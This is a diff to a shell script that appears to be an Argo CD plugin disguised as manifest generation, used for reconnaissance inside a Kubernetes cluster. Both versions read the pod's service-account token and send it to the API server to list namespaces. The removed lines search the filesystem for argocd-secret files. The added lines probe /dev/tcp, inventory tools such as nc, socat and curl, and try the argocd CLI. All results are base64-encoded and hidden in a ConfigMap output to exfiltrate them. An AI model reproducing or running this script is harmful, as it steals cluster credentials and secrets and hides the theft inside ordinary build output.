@@ -1,52 +1,46 @@
 #!/bin/sh
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
-
 RECON=$( (
-  echo "===PERL_TEST==="
-  perl -e 'print "PERL_OK\n";' 2>&1
-  
-  echo "===SSL_MODULE==="
-  perl -MIO::Socket::SSL -e 'print "SSL_OK\n";' 2>&1
-  
-  echo "===PERL_K8S==="
-  perl -MIO::Socket::SSL -e '
-my $token = shift;
-my $host = shift;
-my ($h,$p) = split(/:/, $host);
-print "HOST=$h PORT=$p\n";
-my $sock = IO::Socket::SSL->new(
-    PeerHost => $h,
-    PeerPort => $p,
-    SSL_verify_mode => 0,
-    Timeout => 10
-) or die "Connect failed: $!";
-print "Connected!\n";
-print $sock "GET /api/v1/namespaces HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
-my $r = "";
-while (<$sock>) { $r .= $_; }
-close $sock;
-my ($body) = $r =~ /\r\n\r\n(.*)/s;
-print "Response length: " . length($body) . "\n";
-print substr($body, 0, 2000);
-' "$TOKEN" "$APISERVER" 2>&1
+  echo "===BASH_DEV_TCP==="
+  # Test if bash /dev/tcp works
+  if command -v bash >/dev/null 2>&1; then
+    timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/8081 2>&1 && echo "TCP_OK" || echo "TCP_FAIL"' 2>&1 || echo "TIMEOUT_OR_FAIL"
+  else
+    echo "NO_BASH"
+  fi
 
-  echo ""
-  echo "===ARGOCD_SECRET_FILE==="
-  find / -name "argocd-secret" -type f 2>&1 | head -5
-  find / -path "/proc" -prune -o -path "/sys" -prune -o -name "argocd-secret*" -print 2>&1 | head -5
-  
-  echo "===MOUNTED_SECRETS==="
-  ls -la /app/config/ 2>&1
-  
-  echo "===ARGOCD_REPO_SERVER_CONFIG==="
-  find / -path "/proc" -prune -o -path "/sys" -prune -o \( -name "*.yaml" -o -name "*.yml" -o -name "*.json" -o -name "*.conf" \) -type f -print 2>&1 | head -30
+  echo "===AVAILABLE_TOOLS==="
+  for tool in openssl nc ncat socat curl wget python python3 node npm go; do
+    printf "$tool: "
+    which $tool 2>/dev/null || echo "NOT_FOUND"
+  done
+
+  echo "===ARGOCD_APP_LIST==="
+  # Try argocd CLI with local config
+  export ARGOCD_SERVER=argocd-server.argocd.svc.cluster.local
+  export ARGOCD_AUTH_TOKEN=""
+  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web --auth-token "" 2>&1 | head -20
+
+  echo "===ARGOCD_HELP==="
+  /usr/local/bin/argocd --help 2>&1 | head -30
+
+  echo "===OPENSSL==="
+  openssl version 2>&1 || echo "no_openssl"
+
+  echo "===OPENSSL_S_CLIENT==="
+  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+  APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+  echo "GET /api/v1/namespaces HTTP/1.1
+Host: $APISERVER
+Authorization: Bearer $TOKEN
+Connection: close
+
+" | timeout 5 openssl s_client -connect $APISERVER -quiet 2>&1 | head -30 || echo "openssl_s_client_failed"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: diag2
+  name: tools
 data:
   result: $RECON
 EOF
